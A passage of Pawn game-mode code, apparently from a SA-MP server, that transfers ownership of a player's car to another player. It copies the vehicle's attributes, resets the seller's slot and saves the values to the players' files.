                    SaveKonFloat(playerid, "gAngle", PINFO[OwnableCarOffer[playerid]][gAngle_2]);
                    PINFO[playerid][gParked] = PINFO[OwnableCarOffer[playerid]][gParked_2];
                    SaveKonVal(playerid, "gParked", PINFO[OwnableCarOffer[playerid]][gParked_2]);
                    PlayerInfo[playerid][cMod8] = PlayerInfo[OwnableCarOffer[playerid]][cMod8_2];
                    PlayerInfo[playerid][cMod9] = PlayerInfo[OwnableCarOffer[playerid]][cMod9_2];
                    PlayerInfo[playerid][cMod10] = PlayerInfo[OwnableCarOffer[playerid]][cMod10_2];
                    PlayerInfo[playerid][cMod11] = PlayerInfo[OwnableCarOffer[playerid]][cMod11_2];
                    PlayerInfo[playerid][cMod12] = PlayerInfo[OwnableCarOffer[playerid]][cMod12_2];
                    PlayerInfo[playerid][cMod13] = PlayerInfo[OwnableCarOffer[playerid]][cMod13_2];
                    PlayerInfo[playerid][cMod14] = PlayerInfo[OwnableCarOffer[playerid]][cMod14_2];
                    PlayerInfo[playerid][cMod15] = PlayerInfo[OwnableCarOffer[playerid]][cMod15_2];
                    PlayerInfo[playerid][cMod16] = PlayerInfo[OwnableCarOffer[playerid]][cMod16_2];
                    PlayerInfo[playerid][cMod17] = PlayerInfo[OwnableCarOffer[playerid]][cMod17_2];
                    PlayerInfo[playerid][cPaintJob] = PlayerInfo[OwnableCarOffer[playerid]][cPaintJob_2];
                    PlayerInfo[playerid][cKilo] = PlayerInfo[OwnableCarOffer[playerid]][cKilo_2];
                    PlayerInfo[playerid][cPanel] = PlayerInfo[OwnableCarOffer[playerid]][cPanel_2];
                    PlayerInfo[playerid][cDoors] = PlayerInfo[OwnableCarOffer[playerid]][cDoors_2];
                    PlayerInfo[playerid][cLights] = PlayerInfo[OwnableCarOffer[playerid]][cLights_2];
                    PlayerInfo[playerid][cTires] = PlayerInfo[OwnableCarOffer[playerid]][cTires_2];
                    PINFO[playerid][pCar] = OwnableCarID[playerid];
                    SaveKonVal(playerid, "pCar", OwnableCarID[playerid]);
                    OwnedMashin_2[OwnableCarID[playerid]] = 0;
                    MashinOwner_2[OwnableCarID[playerid]] = 9999;
                    OwnedMashin[OwnableCarID[playerid]] = 1;
                    MashinOwner[OwnableCarID[playerid]] = playerid;
                    PlayerPlayMusic(playerid);
                    PlayerInfo[OwnableCarOffer[playerid]][cLocationx_2] = 0.0;
                    PlayerInfo[OwnableCarOffer[playerid]][cLocationy_2] = 0.0;
                    PlayerInfo[OwnableCarOffer[playerid]][cLocationz_2] = 0.0;
                    PlayerInfo[OwnableCarOffer[playerid]][cAngle_2] = 0.0;
                    PlayerInfo[OwnableCarOffer[playerid]][cColor1_2] = 9999;
                    PlayerInfo[OwnableCarOffer[playerid]][cColor2_2] = 9999;
                    PlayerInfo[OwnableCarOffer[playerid]][cModel_2] = 0;
                    PlayerInfo[OwnableCarOffer[playerid]][cPrice_2] = 0;
                    PlayerInfo[OwnableCarOffer[playerid]][cLock_2] = 0;
                    PlayerInfo[OwnableCarOffer[playerid]][cDestroyed_2] = 0;
                    PINFO[OwnableCarOffer[playerid]][cFixed_2] = 0;
                    SaveKonVal(OwnableCarOffer[playerid], "cFixed_2", 0);
                    PINFO[OwnableCarOffer[playerid]][cInsurance_2] = 0;
                    SaveKonVal(OwnableCarOffer[playerid], "cInsurance_2", 0);
                    PlayerInfo[OwnableCarOffer[playerid]][cFuel_2] = 0;
                    PlayerInfo[OwnableCarOffer[playerid]][cHealth_2] = 0.0;
                    PlayerInfo[OwnableCarOffer[playerid]][cMod1_2] = 0;
                    PlayerInfo[OwnableCarOffer[playerid]][cMod3_2] = 0;
                    PlayerInfo[OwnableCarOffer[playerid]][cMod4_2] = 0;
                    PlayerInfo[OwnableCarOffer[playerid]][cMod5_2] = 0;
                    PlayerInfo[OwnableCarOffer[playerid]][cMod6_2] = 0;
                    PINFO[OwnableCarOffer[playerid]][gLocationX_2] = 0;
                    SaveKonFloat(OwnableCarOffer[playerid], "gLocationX_2", 0);
                    PINFO[OwnableCarOffer[playerid]][gLocationY_2] = 0;
                    SaveKonFloat(OwnableCarOffer[playerid], "gLocationY_2", 0);
                    PINFO[OwnableCarOffer[playerid]][gLocationZ_2] = 0;
                    SaveKonFloat(OwnableCarOffer[playerid], "gLocationZ_2", 0);
                    PINFO[OwnableCarOffer[playerid]][gAngle_2] = 0;
                    SaveKonFloat(OwnableCarOffer[playerid], "gAngle_2", 0);
                    PINFO[OwnableCarOffer[playerid]][gParked_2] = 0;
                    SaveKonVal(OwnableCarOffer[playerid], "gParked_2", 0);
                    PlayerInfo[OwnableCarOffer[playerid]][cMod7_2] = 0;
                    PlayerInfo[OwnableCarOffer[playerid]][cMod8_2] = 0;
                    PlayerInfo[OwnableCarOffer[playerid]][cMod9_2] = 0;
                    PlayerInfo[OwnableCarOffer[playerid]][cMod10_2] = 0;
                    PlayerInfo[OwnableCarOffer[playerid]][cMod11_2] = 0;
                    PlayerInfo[OwnableCarOffer[playerid]][cMod12_2] = 0;
                    PlayerInfo[OwnableCarOffer[playerid]][cMod13_2] = 0;
                    PlayerInfo[OwnableCarOffer[playerid]][cMod14_2] = 0;
                    PlayerInfo[OwnableCarOffer[playerid]][cMod15_2] = 0;
                    PlayerInfo[OwnableCarOffer[playerid]][cMod16_2] = 0;
                    PlayerInfo[OwnableCarOffer[playerid]][cMod17_2] = 0;
                    PlayerInfo[OwnableCarOffer[playerid]][cPaintJob_2] = 3;
                    PlayerInfo[OwnableCarOffer[playerid]][cKilo_2] = 0.0;
                    PlayerInfo[OwnableCarOffer[playerid]][pCar_2] = 0;
                }
                else if(OwnableCarMethod[playerid] == 1 && (PINFO[playerid][pCar] != 0 && PINFO[playerid][pCar_2] == 0))
                {
                    PlayerInfo[playerid][cLocationx_2] = PlayerInfo[OwnableCarOffer[playerid]][cLocationx];
                    PlayerInfo[playerid][cLocationy_2] = PlayerInfo[OwnableCarOffer[playerid]][cLocationy];
                    PlayerInfo[playerid][cLocationz_2] = PlayerInfo[OwnableCarOffer[playerid]][cLocationz];
                    PlayerInfo[playerid][cAngle_2] = PlayerInfo[OwnableCarOffer[playerid]][cAngle];
                    PlayerInfo[playerid][cColor1_2] = PlayerInfo[OwnableCarOffer[playerid]][cColor1];
                    PlayerInfo[playerid][cColor2_2] = PlayerInfo[OwnableCarOffer[playerid]][cColor2];
                    PlayerInfo[playerid][cModel_2] = PlayerInfo[OwnableCarOffer[playerid]][cModel];
                    PlayerInfo[playerid][cPrice_2] = PlayerInfo[OwnableCarOffer[playerid]][cPrice];
                    new plate = PlayerInfo[OwnableCarOffer[playerid]][cPlate];
                    new strings[128];
                    format(strings,128,"%s",plate);
                    strmid(PlayerInfo[playerid][cPlate_2], strings, 0, strlen(strings), 255);
                    PlayerInfo[playerid][cLock_2] = PlayerInfo[OwnableCarOffer[playerid]][cLock];
                    PlayerInfo[playerid][cDestroyed_2] = PlayerInfo[OwnableCarOffer[playerid]][cDestroyed];
                    PlayerInfo[playerid][cFixed_2] = PlayerInfo[OwnableCarOffer[playerid]][cFixed];
                    PINFO[playerid][cInsurance_2] = PlayerInfo[OwnableCarOffer[playerid]][cInsurance];
                    SaveKonVal(playerid, "cInsurance_2", PlayerInfo[OwnableCarOffer[playerid]][cInsurance]);
                    PlayerInfo[playerid][cFuel_2] = PlayerInfo[OwnableCarOffer[playerid]][cFuel];
                    PlayerInfo[playerid][cHealth_2] = PlayerInfo[OwnableCarOffer[playerid]][cHealth];
                    PINFO[playerid][gLocationX_2] = PINFO[OwnableCarOffer[playerid]][gLocationX];
                    SaveKonFloat(playerid, "gLocationX_2", PINFO[OwnableCarOffer[playerid]][gLocationX]);
                    PINFO[playerid][gLocationY_2] = PINFO[OwnableCarOffer[playerid]][gLocationY];
                    SaveKonFloat(playerid, "gLocationY_2", PINFO[OwnableCarOffer[playerid]][gLocationY]);
                    PINFO[playerid][gLocationZ_2] = PINFO[OwnableCarOffer[playerid]][gLocationZ];
                    SaveKonFloat(playerid, "gLocationZ_2", PINFO[OwnableCarOffer[playerid]][gLocationZ]);
                    PINFO[playerid][gAngle_2] = PINFO[OwnableCarOffer[playerid]][gAngle];
                    SaveKonFloat(playerid, "gAngle_2", PINFO[OwnableCarOffer[playerid]][gAngle]);
                    PINFO[playerid][gParked_2] = PINFO[OwnableCarOffer[playerid]][gParked];
                    SaveKonVal(playerid, "gParked_2", PINFO[OwnableCarOffer[playerid]][gParked]);
                    PlayerInfo[playerid][cMod1_2] = PlayerInfo[OwnableCarOffer[playerid]][cMod1];
                    PlayerInfo[playerid][cMod3_2] = PlayerInfo[OwnableCarOffer[playerid]][cMod3];
                    PlayerInfo[playerid][cMod4_2] = PlayerInfo[OwnableCarOffer[playerid]][cMod4];
                    PlayerInfo[playerid][cMod5_2] = PlayerInfo[OwnableCarOffer[playerid]][cMod5];
                    PlayerInfo[playerid][cMod6_2] = PlayerInfo[OwnableCarOffer[playerid]][cMod6];
                    PlayerInfo[playerid][cMod7_2] = PlayerInfo[OwnableCarOffer[playerid]][cMod7];
                    PlayerInfo[playerid][cMod8_2] = PlayerInfo[OwnableCarOffer[playerid]][cMod8];
                    PlayerInfo[playerid][cMod9_2] = PlayerInfo[OwnableCarOffer[playerid]][cMod9];
                    PlayerInfo[playerid][cMod10_2] = PlayerInfo[OwnableCarOffer[playerid]][cMod10];
                    PlayerInfo[playerid][cMod11_2] = PlayerInfo[OwnableCarOffer[playerid]][cMod11];
                    PlayerInfo[playerid][cMod12_2] = PlayerInfo[OwnableCarOffer[playerid]][cMod12];
                    PlayerInfo[playerid][cMod13_2] = PlayerInfo[OwnableCarOffer[playerid]][cMod13];
                    PlayerInfo[playerid][cMod14_2] = PlayerInfo[OwnableCarOffer[playerid]][cMod14];
                    PlayerInfo[playerid][cMod15_2] = PlayerInfo[OwnableCarOffer[playerid]][cMod15];
                    PlayerInfo[playerid][cMod16_2] = PlayerInfo[OwnableCarOffer[playerid]][cMod16];
                    PlayerInfo[playerid][cMod17_2] = PlayerInfo[OwnableCarOffer[playerid]][cMod17];
                    PlayerInfo[playerid][cPaintJob_2] = PlayerInfo[OwnableCarOffer[playerid]][cPaintJob];
                    PlayerInfo[playerid][cKilo_2] = PlayerInfo[OwnableCarOffer[playerid]][cKilo];
                    PlayerInfo[playerid][cPanel_2] = PlayerInfo[OwnableCarOffer[playerid]][cPanel];
                    PlayerInfo[playerid][cDoors_2] = PlayerInfo[OwnableCarOffer[playerid]][cDoors];
                    PlayerInfo[playerid][cLights_2] = PlayerInfo[OwnableCarOffer[playerid]][cLights];
                    PlayerInfo[playerid][cTires_2] = PlayerInfo[OwnableCarOffer[playerid]][cTires];
                    PINFO[playerid][pCar_2] = OwnableCarID[playerid];
                    SaveKonVal(playerid, "pCar_2", OwnableCarID[playerid]);
                    OwnedMashin[OwnableCarID[playerid]] = 0;
                    MashinOwner[OwnableCarID[playerid]] = 9999;
                    OwnedMashin_2[OwnableCarID[playerid]] = 1;
                    MashinOwner_2[OwnableCarID[playerid]] = playerid;
                    PlayerPlayMusic(playerid);
                    PlayerInfo[OwnableCarOffer[playerid]][cLocationx] = 0.0;
                    PlayerInfo[OwnableCarOffer[playerid]][cLocationy] = 0.0;
                    PlayerInfo[OwnableCarOffer[playerid]][cLocationz] = 0.0;
                    PlayerInfo[OwnableCarOffer[playerid]][cAngle] = 0.0;
                    PlayerInfo[OwnableCarOffer[playerid]][cColor1] = 9999;
                    PlayerInfo[OwnableCarOffer[playerid]][cColor2] = 9999;
                    PlayerInfo[OwnableCarOffer[playerid]][cModel] = 0;
                    PlayerInfo[OwnableCarOffer[playerid]][cPrice] = 0;
                    PlayerInfo[OwnableCarOffer[playerid]][cLock] = 0;
                    PlayerInfo[OwnableCarOffer[playerid]][cDestroyed] = 0;
                    PINFO[OwnableCarOffer[playerid]][cFixed] = 0;
                    SaveKonVal(OwnableCarOffer[playerid], "cFixed", 0);
                    PINFO[OwnableCarOffer[playerid]][cInsurance] = 0;
                    SaveKonVal(OwnableCarOffer[playerid], "cInsurance", 0);
                    PlayerInfo[OwnableCarOffer[playerid]][cFuel] = 0;
                    PlayerInfo[OwnableCarOffer[playerid]][cHealth] = 0.0;
                    PlayerInfo[OwnableCarOffer[playerid]][cMod1] = 0;
                    PlayerInfo[OwnableCarOffer[playerid]][cMod3] = 0;
                    PlayerInfo[OwnableCarOffer[playerid]][cMod4] = 0;
                    PlayerInfo[OwnableCarOffer[playerid]][cMod5] = 0;
                    PlayerInfo[OwnableCarOffer[playerid]][cMod6] = 0;
                    PlayerInfo[OwnableCarOffer[playerid]][cMod7] = 0;
                    PlayerInfo[OwnableCarOffer[playerid]][cMod8] = 0;
                    PlayerInfo[OwnableCarOffer[playerid]][cMod9] = 0;
                    PlayerInfo[OwnableCarOffer[playerid]][cMod10] = 0;
                    PlayerInfo[OwnableCarOffer[playerid]][cMod11] = 0;
                    PlayerInfo[OwnableCarOffer[playerid]][cMod12] = 0;
                    PlayerInfo[OwnableCarOffer[playerid]][cMod13] = 0;
                    PlayerInfo[OwnableCarOffer[playerid]][cMod14] = 0;
                    PINFO[OwnableCarOffer[playerid]][gLocationX_2] = 0;
                    SaveKonFloat(OwnableCarOffer[playerid], "gLocationX_2", 0);
                    PINFO[OwnableCarOffer[playerid]][gLocationY_2] = 0;
                    SaveKonFloat(OwnableCarOffer[playerid], "gLocationY_2", 0);
                    PINFO[OwnableCarOffer[playerid]][gLocationZ_2] = 0;
                    SaveKonFloat(OwnableCarOffer[playerid], "gLocationZ_2", 0);
                    PINFO[OwnableCarOffer[playerid]][gAngle_2] = 0;
                    SaveKonFloat(OwnableCarOffer[playerid], "gAngle_2", 0);
                    PINFO[OwnableCarOffer[playerid]][gParked_2] = 0;
                    SaveKonVal(OwnableCarOffer[playerid], "gParked_2", 0);
                    PlayerInfo[OwnableCarOffer[playerid]][cMod15] = 0;
                    PlayerInfo[OwnableCarOffer[playerid]][cMod16] = 0;
                    PlayerInfo[OwnableCarOffer[playerid]][cMod17] = 0;
                    PlayerInfo[OwnableCarOffer[playerid]][cPaintJob] = 3;
                    PlayerInfo[OwnableCarOffer[playerid]][cKilo] = 0.0;
                    PlayerInfo[OwnableCarOffer[playerid]][pCar] = 0;
                }
                else if(OwnableCarMethod[playerid] == 2 && (PINFO[playerid][pCar] != 0 && PINFO[playerid][pCar_2] == 0))
                {
                    PlayerInfo[playerid][cLocationx_2] = PlayerInfo[OwnableCarOffer[playerid]][cLocationx_2];
                    PlayerInfo[playerid][cLocationy_2] = PlayerInfo[OwnableCarOffer[playerid]][cLocationy_2];
                    PlayerInfo[playerid][cLocationz_2] = PlayerInfo[OwnableCarOffer[playerid]][cLocationz_2];
                    PlayerInfo[playerid][cAngle_2] = PlayerInfo[OwnableCarOffer[playerid]][cAngle_2];
                    PlayerInfo[playerid][cColor1_2] = PlayerInfo[OwnableCarOffer[playerid]][cColor1_2];
                    PlayerInfo[playerid][cColor2_2] = PlayerInfo[OwnableCarOffer[playerid]][cColor2_2];
                    PlayerInfo[playerid][cModel_2] = PlayerInfo[OwnableCarOffer[playerid]][cModel_2];
                    PlayerInfo[playerid][cPrice_2] = PlayerInfo[OwnableCarOffer[playerid]][cPrice_2];
                    new plate = PlayerInfo[OwnableCarOffer[playerid]][cPlate_2];
                    new strings[128];
                    format(strings,128,"%s",plate);
                    strmid(PlayerInfo[playerid][cPlate_2], strings, 0, strlen(strings), 255);
                    PlayerInfo[playerid][cLock_2] = PlayerInfo[OwnableCarOffer[playerid]][cLock_2];
                    PlayerInfo[playerid][cDestroyed_2] = PlayerInfo[OwnableCarOffer[playerid]][cDestroyed_2];
                    PlayerInfo[playerid][cFixed_2] = PlayerInfo[OwnableCarOffer[playerid]][cFixed_2];
                    PINFO[playerid][cInsurance_2] = PlayerInfo[OwnableCarOffer[playerid]][cInsurance_2];
                    SaveKonVal(playerid, "cInsurance_2", PlayerInfo[OwnableCarOffer[playerid]][cInsurance_2]);
                    PlayerInfo[playerid][cFuel_2] = PlayerInfo[OwnableCarOffer[playerid]][cFuel_2];
                    PlayerInfo[playerid][cHealth_2] = PlayerInfo[OwnableCarOffer[playerid]][cHealth_2];
                    PlayerInfo[playerid][cMod1_2] = PlayerInfo[OwnableCarOffer[playerid]][cMod1_2];
                    PlayerInfo[playerid][cMod3_2] = PlayerInfo[OwnableCarOffer[playerid]][cMod3_2];
                    PlayerInfo[playerid][cMod4_2] = PlayerInfo[OwnableCarOffer[playerid]][cMod4_2];
                    PlayerInfo[playerid][cMod5_2] = PlayerInfo[OwnableCarOffer[playerid]][cMod5_2];
                    PlayerInfo[playerid][cMod6_2] = PlayerInfo[OwnableCarOffer[playerid]][cMod6_2];
                    PlayerInfo[playerid][cMod7_2] = PlayerInfo[OwnableCarOffer[playerid]][cMod7_2];
                    PlayerInfo[playerid][cMod8_2] = PlayerInfo[OwnableCarOffer[playerid]][cMod8_2];
                    PINFO[playerid][gLocationX_2] = PINFO[OwnableCarOffer[playerid]][gLocationX_2];
                    SaveKonFloat(playerid, "gLocationX_2", PINFO[OwnableCarOffer[playerid]][gLocationX_2]);
                    PINFO[playerid][gLocationY_2] = PINFO[OwnableCarOffer[playerid]][gLocationY_2];
                    SaveKonFloat(playerid, "gLocationY_2", PINFO[OwnableCarOffer[playerid]][gLocationY_2]);
                    PINFO[playerid][gLocationZ_2] = PINFO[OwnableCarOffer[playerid]][gLocationZ_2];
                    SaveKonFloat(playerid, "gLocationZ_2", PINFO[OwnableCarOffer[playerid]][gLocationZ_2]);
                    PINFO[playerid][gAngle_2] = PINFO[OwnableCarOffer[playerid]][gAngle_2];
                    SaveKonFloat(playerid, "gAngle_2", PINFO[OwnableCarOffer[playerid]][gAngle_2]);
                    PINFO[playerid][gParked_2] = PINFO[OwnableCarOffer[playerid]][gParked_2];
                    SaveKonVal(playerid, "gParked_2", PINFO[OwnableCarOffer[playerid]][gParked_2]);
                    PlayerInfo[playerid][cMod9_2] = PlayerInfo[OwnableCarOffer[playerid]][cMod9_2];
                    PlayerInfo[playerid][cMod10_2] = PlayerInfo[OwnableCarOffer[playerid]][cMod10_2];
                    PlayerInfo[playerid][cMod11_2] = PlayerInfo[OwnableCarOffer[playerid]][cMod11_2];
                    PlayerInfo[playerid][cMod12_2] = PlayerInfo[OwnableCarOffer[playerid]][cMod12_2];
                    PlayerInfo[playerid][cMod13_2] = PlayerInfo[OwnableCarOffer[playerid]][cMod13_2];
                    PlayerInfo[playerid][cMod14_2] = PlayerInfo[OwnableCarOffer[playerid]][cMod14_2];
                    PlayerInfo[playerid][cMod15_2] = PlayerInfo[OwnableCarOffer[playerid]][cMod15_2];
                    PlayerInfo[playerid][cMod16_2] = PlayerInfo[OwnableCarOffer[playerid]][cMod16_2];
                    PlayerInfo[playerid][cMod17_2] = PlayerInfo[OwnableCarOffer[playerid]][cMod17_2];
                    PlayerInfo[playerid][cPaintJob_2] = PlayerInfo[OwnableCarOffer[playerid]][cPaintJob_2];
                    PlayerInfo[playerid][cKilo_2] = PlayerInfo[OwnableCarOffer[playerid]][cKilo_2];
                    PlayerInfo[playerid][cPanel_2] = PlayerInfo[OwnableCarOffer[playerid]][cPanel_2];
                    PlayerInfo[playerid][cDoors_2] = PlayerInfo[OwnableCarOffer[playerid]][cDoors_2];
                    PlayerInfo[playerid][cLights_2] = PlayerInfo[OwnableCarOffer[playerid]][cLights_2];
                    PlayerInfo[playerid][cTires_2] = PlayerInfo[OwnableCarOffer[playerid]][cTires_2];
                    PINFO[playerid][pCar_2] = OwnableCarID[playerid];
                    SaveKonVal(playerid, "pCar_2", OwnableCarID[playerid]);
                    OwnedMashin_2[OwnableCarID[playerid]] = 1;
                    MashinOwner_2[OwnableCarID[playerid]] = playerid;
                    PlayerPlayMusic(playerid);
                    PlayerInfo[OwnableCarOffer[playerid]][cLocationx_2] = 0.0;
                    PlayerInfo[OwnableCarOffer[playerid]][cLocationy_2] = 0.0;
                    PlayerInfo[OwnableCarOffer[playerid]][cLocationz_2] = 0.0;
                    PlayerInfo[OwnableCarOffer[playerid]][cAngle_2] = 0.0;
                    PlayerInfo[OwnableCarOffer[playerid]][cColor1_2] = 9999;
                    PlayerInfo[OwnableCarOffer[playerid]][cColor2_2] = 9999;
                    PlayerInfo[OwnableCarOffer[playerid]][cModel_2] = 0;
                    PlayerInfo[OwnableCarOffer[playerid]][cPrice_2] = 0;
                    PlayerInfo[OwnableCarOffer[playerid]][cLock_2] = 0;
                    PlayerInfo[OwnableCarOffer[playerid]][cDestroyed_2] = 0;
                    PINFO[OwnableCarOffer[playerid]][cFixed_2] = 0;
                    SaveKonVal(OwnableCarOffer[playerid], "cFixed_2", 0);
                    PINFO[OwnableCarOffer[playerid]][cInsurance_2] = 0;
                    SaveKonVal(OwnableCarOffer[playerid], "cInsurance_2", 0);
                    PlayerInfo[OwnableCarOffer[playerid]][cFuel_2] = 0;
                    PlayerInfo[OwnableCarOffer[playerid]][cHealth_2] = 0.0;
                    PlayerInfo[OwnableCarOffer[playerid]][cMod1_2] = 0;
                    PlayerInfo[OwnableCarOffer[playerid]][cMod3_2] = 0;
                    PlayerInfo[OwnableCarOffer[playerid]][cMod4_2] = 0;
                    PlayerInfo[OwnableCarOffer[playerid]][cMod5_2] = 0;
                    PlayerInfo[OwnableCarOffer[playerid]][cMod6_2] = 0;
                    PlayerInfo[OwnableCarOffer[playerid]][cMod7_2] = 0;
                    PlayerInfo[OwnableCarOffer[playerid]][cMod8_2] = 0;
                    PlayerInfo[OwnableCarOffer[playerid]][cMod9_2] = 0;
                    PlayerInfo[OwnableCarOffer[playerid]][cMod10_2] = 0;
                    PlayerInfo[OwnableCarOffer[playerid]][cMod11_2] = 0;
                    PlayerInfo[OwnableCarOffer[playerid]][cMod12_2] = 0;
                    PlayerInfo[OwnableCarOffer[playerid]][cMod13_2] = 0;
                    PlayerInfo[OwnableCarOffer[playerid]][cMod14_2] = 0;
                    PINFO[OwnableCarOffer[playerid]][gLocationX_2] = 0;
                    SaveKonFloat(OwnableCarOffer[playerid], "gLocationX_2", 0);
                    PINFO[OwnableCarOffer[playerid]][gLocationY_2] = 0;
                    SaveKonFloat(OwnableCarOffer[playerid], "gLocationY_2", 0);
                    PINFO[OwnableCarOffer[playerid]][gLocationZ_2] = 0;
                    SaveKonFloat(OwnableCarOffer[playerid], "gLocationZ_2", 0);
                    PINFO[OwnableCarOffer[playerid]][gAngle_2] = 0;
                    SaveKonFloat(OwnableCarOffer[playerid], "gAngle_2", 0);
                    PINFO[OwnableCarOffer[playerid]][gParked_2] = 0;
                    SaveKonVal(OwnableCarOffer[playerid], "gParked_2", 0);
                    PlayerInfo[OwnableCarOffer[playerid]][cMod15_2] = 0;
                    PlayerInfo[OwnableCarOffer[playerid]][cMod16_2] = 0;
                    PlayerInfo[OwnableCarOffer[playerid]][cMod17_2] = 0;
                    PlayerInfo[OwnableCarOffer[playerid]][cPaintJob_2] = 3;
                    PlayerInfo[OwnableCarOffer[playerid]][cKilo_2] = 0.0;
                    PlayerInfo[OwnableCarOffer[playerid]][pCar_2] = 0;
                }
                SaveKonFloat(OwnableCarOffer[playerid], "cLocationx", PINFO[OwnableCarOffer[playerid]][cLocationx]);
                SaveKonFloat(OwnableCarOffer[playerid], "cLocationy", PINFO[OwnableCarOffer[playerid]][cLocationy]);
                SaveKonFloat(OwnableCarOffer[playerid], "cLocationz", PINFO[OwnableCarOffer[playerid]][cLocationz]);
                SaveKonFloat(OwnableCarOffer[playerid], "cAngle", PINFO[OwnableCarOffer[playerid]][cAngle]);
                SaveKonVal(OwnableCarOffer[playerid], "cColor1", PINFO[OwnableCarOffer[playerid]][cColor1]);
                SaveKonVal(OwnableCarOffer[playerid], "cColor2", PINFO[OwnableCarOffer[playerid]][cColor2]);
                SaveKonVal(OwnableCarOffer[playerid], "cModel", PINFO[OwnableCarOffer[playerid]][cModel]);
                SaveKonVal(OwnableCarOffer[playerid], "cPrice", PINFO[OwnableCarOffer[playerid]][cPrice]);
                SaveKonStr(OwnableCarOffer[playerid], "cPlate", PINFO[OwnableCarOffer[playerid]][cPlate]);
                SaveKonVal(OwnableCarOffer[playerid], "cLock", PINFO[OwnableCarOffer[playerid]][cLock]);
                SaveKonVal(OwnableCarOffer[playerid], "cDestroyed", PINFO[OwnableCarOffer[playerid]][cDestroyed]);
                SaveKonVal(OwnableCarOffer[playerid], "cFixed", PINFO[OwnableCarOffer[playerid]][cFixed]);
                SaveKonVal(OwnableCarOffer[playerid], "cInsurance", PINFO[OwnableCarOffer[playerid]][cInsurance]);
                SaveKonVal(OwnableCarOffer[playerid], "cFuel", PINFO[OwnableCarOffer[playerid]][cFuel]);
                SaveKonFloat(OwnableCarOffer[playerid], "cHealth", PINFO[OwnableCarOffer[playerid]][cHealth]);
                SaveKonVal(OwnableCarOffer[playerid], "cMod1", PINFO[OwnableCarOffer[playerid]][cMod1]);
                SaveKonVal(OwnableCarOffer[playerid], "cMod3", PINFO[OwnableCarOffer[playerid]][cMod3]);
                SaveKonVal(OwnableCarOffer[playerid], "cMod4", PINFO[OwnableCarOffer[playerid]][cMod4]);
                SaveKonVal(OwnableCarOffer[playerid], "cMod5", PINFO[OwnableCarOffer[playerid]][cMod5]);
                SaveKonVal(OwnableCarOffer[playerid], "cMod6", PINFO[OwnableCarOffer[playerid]][cMod6]);
                SaveKonVal(OwnableCarOffer[playerid], "cMod7", PINFO[OwnableCarOffer[playerid]][cMod7]);
                SaveKonVal(OwnableCarOffer[playerid], "cMod8", PINFO[OwnableCarOffer[playerid]][cMod8]);
                SaveKonVal(OwnableCarOffer[playerid], "cMod9", PINFO[OwnableCarOffer[playerid]][cMod9]);
                SaveKonVal(OwnableCarOffer[playerid], "cMod10", PINFO[OwnableCarOffer[playerid]][cMod10]);
                SaveKonVal(OwnableCarOffer[playerid], "cMod11", PINFO[OwnableCarOffer[playerid]][cMod11]);
                SaveKonVal(OwnableCarOffer[playerid], "cMod12", PINFO[OwnableCarOffer[playerid]][cMod12]);
                SaveKonVal(OwnableCarOffer[playerid], "cMod13", PINFO[OwnableCarOffer[playerid]][cMod13]);
                SaveKonVal(OwnableCarOffer[playerid], "cMod14", PINFO[OwnableCarOffer[playerid]][cMod14]);
                SaveKonVal(OwnableCarOffer[playerid], "cMod15", PINFO[OwnableCarOffer[playerid]][cMod15]);
                SaveKonVal(OwnableCarOffer[playerid], "cMod16", PINFO[OwnableCarOffer[playerid]][cMod16]);
                SaveKonVal(OwnableCarOffer[playerid], "cMod17", PINFO[OwnableCarOffer[playerid]][cMod17]);
                SaveKonFloat(OwnableCarOffer[playerid], "gLocationX", PINFO[OwnableCarOffer[playerid]][gLocationX]);
                SaveKonFloat(OwnableCarOffer[playerid], "gLocationY", PINFO[OwnableCarOffer[playerid]][gLocationY]);
                SaveKonFloat(OwnableCarOffer[playerid], "gLocationZ", PINFO[OwnableCarOffer[playerid]][gLocationZ]);
                SaveKonFloat(OwnableCarOffer[playerid], "gAngle", PINFO[OwnableCarOffer[playerid]][gAngle]);
                SaveKonVal(OwnableCarOffer[playerid], "gParked", PINFO[OwnableCarOffer[playerid]][gParked]);
                SaveKonVal(OwnableCarOffer[playerid], "cPaintJob", PINFO[OwnableCarOffer[playerid]][cPaintJob]);
                SaveKonFloat(OwnableCarOffer[playerid], "cKilo", PINFO[OwnableCarOffer[playerid]][cKilo]);
                SaveKonVal(OwnableCarOffer[playerid], "cPanel", PINFO[OwnableCarOffer[playerid]][cPanel]);
                SaveKonVal(OwnableCarOffer[playerid], "cDoors", PINFO[OwnableCarOffer[playerid]][cDoors]);
                SaveKonVal(OwnableCarOffer[playerid], "cLights", PINFO[OwnableCarOffer[playerid]][cLights]);
                SaveKonVal(OwnableCarOffer[playerid], "cTires", PINFO[OwnableCarOffer[playerid]][cTires]);
                SaveKonVal(OwnableCarOffer[playerid], "pCar", PINFO[OwnableCarOffer[playerid]][pCar]);
                //
                SaveKonFloat(OwnableCarOffer[playerid], "cLocationx_2", PINFO[OwnableCarOffer[playerid]][cLocationx_2]);
                SaveKonFloat(OwnableCarOffer[playerid], "cLocationy_2", PINFO[OwnableCarOffer[playerid]][cLocationy_2]);
                SaveKonFloat(OwnableCarOffer[playerid], "cLocationz_2", PINFO[OwnableCarOffer[playerid]][cLocationz_2]);
                SaveKonFloat(OwnableCarOffer[playerid], "cAngle_2", PINFO[OwnableCarOffer[playerid]][cAngle_2]);
                SaveKonVal(OwnableCarOffer[playerid], "cColor1_2", PINFO[OwnableCarOffer[playerid]][cColor1_2]);
                SaveKonVal(OwnableCarOffer[playerid], "cColor2_2", PINFO[OwnableCarOffer[playerid]][cColor2_2]);
                SaveKonVal(OwnableCarOffer[playerid], "cModel_2", PINFO[OwnableCarOffer[playerid]][cModel_2]);
                SaveKonVal(OwnableCarOffer[playerid], "cPrice_2", PINFO[OwnableCarOffer[playerid]][cPrice_2]);
                SaveKonStr(OwnableCarOffer[playerid], "cPlate_2", PINFO[OwnableCarOffer[playerid]][cPlate_2]);
                SaveKonVal(OwnableCarOffer[playerid], "cLock_2", PINFO[OwnableCarOffer[playerid]][cLock_2]);
                SaveKonVal(OwnableCarOffer[playerid], "cDestroyed_2", PINFO[OwnableCarOffer[playerid]][cDestroyed_2]);
                SaveKonVal(OwnableCarOffer[playerid], "cFixed_2", PINFO[OwnableCarOffer[playerid]][cFixed_2]);
                SaveKonVal(OwnableCarOffer[playerid], "cInsurance_2", PINFO[OwnableCarOffer[playerid]][cInsurance_2]);
                SaveKonVal(OwnableCarOffer[playerid], "cFuel_2", PINFO[OwnableCarOffer[playerid]][cFuel_2]);
                SaveKonFloat(OwnableCarOffer[playerid], "cHealth_2", PINFO[OwnableCarOffer[playerid]][cHealth_2]);
